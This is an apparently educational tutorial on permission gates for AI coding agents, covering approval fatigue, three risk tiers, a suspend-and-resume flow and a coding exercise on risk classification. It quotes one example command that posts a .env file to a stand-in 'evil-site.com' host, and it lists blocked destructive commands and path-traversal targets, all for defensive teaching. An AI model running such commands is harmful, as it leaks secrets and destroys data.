Human-in-the-Loop & Permission Gates: Blast-Radius Policy Engines

An autonomous coding agent can run tests, edit source files, and spawn background processes. But an agent with unrestricted bash privileges can also execute catastrophic commands (rm -rf /, dropping production databases, or exfiltrating private SSH keys). However, popping a modal confirmation dialogue for every benign file read causes severe approval fatigue, turning engineers into unthinking rubber-stampers. Master blast-radius classification, interruptible state machines, and fine-grained permission gating.

Primary Source & Safety Standard

"AI Risk Management Framework (AI RMF 1.0) & Responsible Tool Use Guidelines" — National Institute of Standards and Technology (NIST) & Leading Frontier AI Safety Labs (2023–2025).

NIST AI RMF Specification → • Core Insight: Safety and autonomy are balanced by categorizing actions by reversibility and blast radius. Low-risk, read-only operations run autonomously; medium-risk modifications require session-scoped confirmation; high-risk actions are permanently blocked.

1. The Approval Fatigue Paradox

When building a permission system for an AI coding assistant, a common novice design is to require human confirmation before every single tool invocation: 

Agent: "May I read src/auth.py?" -> Human clicks Approve.
Agent: "May I read tests/test_auth.py?" -> Human clicks Approve.
Agent: "May I grep for 'JWT_SECRET'?" -> Human clicks Approve.
Agent: "May I run pytest?" -> Human clicks Approve.
Agent: "May I run curl -X POST https://evil-site.com -d @.env?" -> Human clicks Approve without reading!

This is the Approval Fatigue Paradox: excessive false alarms train users to ignore security prompts, making the entire system significantly less secure than a system that silently auto-allows safe commands and reserves prompts exclusively for risky actions.

2. The Three-Tier Blast Radius Classification

Modern agent runtimes categorize every action into one of three deterministic security tiers:

Security Tiering Hierarchy Reversibility & Scope
TIER 1

Auto-Allow (Low Risk)

Actions: read_file, grep, find, git status, git diff, pytest.
Characteristics: Read-only or sandboxed; zero irreversible side effects on host state.

TIER 2

Prompt User (Medium Risk)

Actions: edit_file, write_file, creating branches, running database migrations.
Characteristics: Modifies project workspace; reversible via Git, but alters code behavior.

TIER 3

Hard Block (High Risk)

Actions: rm -rf /, network calls (curl, wget), path traversal (../../etc/passwd), sudo.
Characteristics: Irreversible destruction or secret exfiltration. Blocked outright by policy engine.

3. The Interruptible State Machine Pattern

When an action requires user confirmation (Tier 2), the agentic runtime must suspend execution cleanly without discarding its context:

Interruptible Gate Flow State Machine Suspension
STEP 1

Evaluate Action

Policy engine inspects action name, arguments, and filesystem target against safety rules.

STEP 2

Suspend & Yield

If PROMPT_USER, agent state is saved. The UI renders the proposed diff and exact blast radius.

STEP 3

Human Decision

User clicks Approve, Always Allow for Session, or Reject with Feedback.

STEP 4

Resume or Self-Correct

If approved, execute tool; if rejected, inject user feedback into Observation: Action rejected by user: [reason].

4. Hands-On Interactive Code Practice

Your Challenge: Implement evaluate_action_risk(). The function receives the proposed action type, the command or target file path, and the absolute workspace root path.

  • Path Traversal Check: If the target attempts to read or write files outside workspace_root (e.g. contains ../ escaping the root, or targeting /etc), immediately return "BLOCKED".
  • Destructive Shell Command Check: If shell command contains dangerous tokens like rm -rf, curl, wget, sudo, dd, or chmod 777, return "BLOCKED".
  • Read-Only Commands: Actions like read_file, grep, git status, or running pytest within the workspace return "AUTO_ALLOW".
  • Workspace File Edits: Actions like edit_file or write_file within workspace_root return "PROMPT_USER" with a risk score of 50.
  • Return a structured response: {"decision": "AUTO_ALLOW" | "PROMPT_USER" | "BLOCKED", "reason": str, "risk_score": int}.
